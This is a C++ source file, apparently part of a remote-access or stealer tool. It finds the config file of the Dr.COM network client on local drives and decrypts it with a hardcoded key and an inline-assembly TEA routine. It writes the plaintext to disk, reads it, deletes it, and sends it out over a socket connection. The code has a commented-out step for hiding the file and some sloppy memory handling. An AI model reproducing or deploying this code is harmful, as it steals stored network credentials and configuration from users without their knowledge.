#include "stdafx.h"

CDecrypt::CDecrypt() 
{
	Info = { "config","3J21d456j87jIOJ9" };
}


CDecrypt::~CDecrypt()
{
}

void CDecrypt::StartDecrypt(SockJolly *Sock)
{
	this->Decrypt();
	char L_Info[1024 * 10] = { 0 };
	char DecryptBuf[256];
	sprintf_s(DecryptBuf, sizeof(DecryptBuf), "D:\\Decrypt_config.txt", Info.filename);
	FILE *fp = fopen(DecryptBuf, "rb");
	if (!fp) {
		sprintf_s(DecryptBuf, sizeof(DecryptBuf), "C:\\Decrypt_config.txt", Info.filename);
		fp = fopen(DecryptBuf, "rb");
	}

	if (fp) {
		int nCount = fread(L_Info, 1, sizeof(L_Info), fp);	//得到w_char数据
		char *sInfo = new char[nCount + 1];					//准备转换char数据
		fclose(fp);
		remove(DecryptBuf);		//删除生成的解密文件
		strcpy(sInfo, &(W_Char2Char(L_Info, nCount)));
		Sock->Send(sInfo, strlen(sInfo));
	}
}

char& CDecrypt::W_Char2Char(char w_char[], int LCLen)
{
	char *sInfo = new char[LCLen];
	int i = 0;
	char *pL = w_char;
	while (i < LCLen / 2)
		sInfo[i++] = w_char[i * 2];

	return *sInfo;
}

void CDecrypt::Decrypt()
{
	char Npath[256] = { ":\\Drcom\\DrUpdateClient\\" };
	char strbuf[256];
	UINT32 keys[4], dec_data1, dec_data2, enc_data[3];

	for (int i = 0; i < 4; ++i) {
		memcpy(&keys[i], Info.key + 4 * i, 4);
	}

	FILE *fpIn = fopen(Info.filename, "r");
	if (!fpIn)//如果找不到配置文件
	{
		sprintf_s(strbuf, sizeof(strbuf), "%s%s%s", "C", Npath, Info.filename);
		fpIn = fopen(strbuf, "r");
		if (!fpIn)
		{
			sprintf_s(strbuf, sizeof(strbuf), "%s%s%s", "D", Npath, Info.filename);
			fpIn = fopen(strbuf, "r");
			if (!fpIn)
			{
				sprintf_s(strbuf, sizeof(strbuf), "%s%s%s", "E", Npath, Info.filename);
				fpIn = fopen(strbuf, "r");
				if (!fpIn)
				{
					sprintf_s(strbuf, sizeof(strbuf), "%s%s%s", "F", Npath, Info.filename);
					fpIn = fopen(strbuf, "r");
					if (!fpIn)
					{
						sprintf_s(strbuf, sizeof(strbuf), "%s%s%s", "G", Npath, Info.filename);
						fpIn = fopen(strbuf, "r");
					}
				}
			}
		}
	}
	//找到配置文件，正常情况：
	sprintf_s(strbuf, sizeof(strbuf), "D:\\Decrypt_%s.txt", Info.filename);
	FILE *fpOut = fopen(strbuf, "wb");
	if (!fpOut) {
		sprintf_s(strbuf, sizeof(strbuf), "C:\\Decrypt_%s.txt", Info.filename);
		fpOut = fopen(strbuf, "wb");
		if (!fpOut) {
			return;
		}
	}

	while (true)
	{
		int i = 0;
		while (i < 8)
		{
			if (fscanf_s(fpIn, "%02x", &((char *)enc_data)[i]) <= 0)
				goto end;
			++i;
		}
		decrypt(enc_data[0], enc_data[1], keys[0], keys[1], keys[2], keys[3], &dec_data1, &dec_data2);
		fwrite(&dec_data1, 4, 1, fpOut);
		fwrite(&dec_data2, 4, 1, fpOut);
	}
end:
	fclose(fpIn);
	fclose(fpOut);
	//system("attrib +h D:\\Decrypt_config.txt");//添加隐藏属性
}

void CDecrypt::decrypt(UINT32 data1, UINT32 data2,
	UINT32 key1, UINT32 key2, UINT32 key3, UINT32 key4,
	PUINT32 value1, PUINT32 value2)
{
	__asm {
		MOV     ECX, data1
			MOV     EAX, data2
			MOV     EDX, 0xC6EF3720;  const
			MOV     ESI, 0x20
			_decrypt_start:
		MOV     EDI, ECX
			SAR     EDI, 5
			ADD     EDI, key4;  key4
			MOV     EBX, ECX
			SHL     EBX, 4
			ADD     EBX, key3;  key3
			SUB     ESI, 1
			XOR     EDI, EBX
			LEA     EBX, DWORD PTR DS : [EDX + ECX];  ebx = edx + ecx
			XOR     EDI, EBX
			SUB     EAX, EDI
			MOV     EDI, EAX
			SAR     EDI, 5
			ADD     EDI, key2;  key2
			MOV     EBX, EAX
			SHL     EBX, 4
			ADD     EBX, key1;  key1
			XOR     EDI, EBX
			LEA     EBX, DWORD PTR DS : [EDX + EAX]
			XOR     EDI, EBX
			SUB     ECX, EDI
			ADD     EDX, 0x61C88647
			TEST    ESI, ESI
			JG      _decrypt_start
			MOV     data1, ECX
			MOV     data2, EAX
	};
	*value1 = data1;
	*value2 = data2;
}
